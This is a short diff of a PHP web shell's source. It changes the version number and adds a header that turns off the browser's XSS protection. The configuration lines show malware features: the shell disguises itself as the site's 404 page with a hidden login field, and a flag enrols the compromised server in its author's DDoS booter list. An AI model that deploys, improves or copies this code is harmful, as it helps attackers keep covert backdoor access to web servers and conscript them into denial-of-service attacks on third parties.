@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.74;
+$version            = 2.75;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -155,6 +155,7 @@ if($charsetpage == '' && $_SESSION[$prefixme.'charsetpage'] == ''){
 if (isset($charsetpagedb[$charsetpage])) {
 	header("content-Type: text/html; charset=".$charsetpage);
 }
+header("X-XSS-Protection: 0");
 $self      = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 $timestamp = time();
 if ($action == "logout") {
